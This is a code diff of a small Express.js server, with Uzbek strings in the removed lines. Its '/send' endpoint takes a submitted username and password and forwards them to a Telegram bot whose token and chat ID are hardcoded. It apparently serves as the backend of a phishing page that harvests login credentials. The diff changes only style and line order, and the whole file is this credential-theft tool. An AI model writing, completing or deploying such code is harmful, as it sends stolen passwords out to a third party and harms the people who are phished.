@@ -1,34 +1,34 @@
-import express from "express";
-import cors from "cors";
+import express from 'express';
+import cors from 'cors';
+import fetch from 'node-fetch';
 
 const app = express();
-app.use(cors()); // Frontend dan kelayotgan so'rovlar uchun
-app.use(express.urlencoded({ extended: true }));
+const BOT_TOKEN = '8434307879:AAFG2h5Z59_7JPziceP4E2Exksk7wuVmuXM';
+const CHAT_ID = '7527317470';
+
+app.use(cors());
 app.use(express.json());
 
-const BOT_TOKEN = "8434307879:AAFG2h5Z59_7JPziceP4E2Exksk7wuVmuXM";
-const CHAT_ID = "7527317470";
-
-app.post("/send", async (req, res) => {
+app.post('/send', async (req, res) => {
   const { username, password } = req.body;
+  const message = `📩 Username: ${username}\n🔑 Password: ${password}`;
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: `📩 Yangi ma'lumot:\n👤 Username: ${username}\n🔑 Password: ${password}`
-      })
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
     });
 
-    if (!response.ok) throw new Error(`Telegram API xatosi: ${response.status}`);
-
-    res.send("✅ Ma'lumot yuborildi!");
-  } catch (err) {
-    console.error("Xato:", err);
-    res.status(500).send("❌ Xato yuz berdi");
+    if (response.ok) {
+      res.status(200).send('Message sent to Telegram');
+    } else {
+      res.status(500).send('Failed to send message');
+    }
+  } catch (error) {
+    res.status(500).send('Error sending message');
   }
 });
 
-app.listen(3000, () => console.log("✅ Server ishlayapti 3000-portda"));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
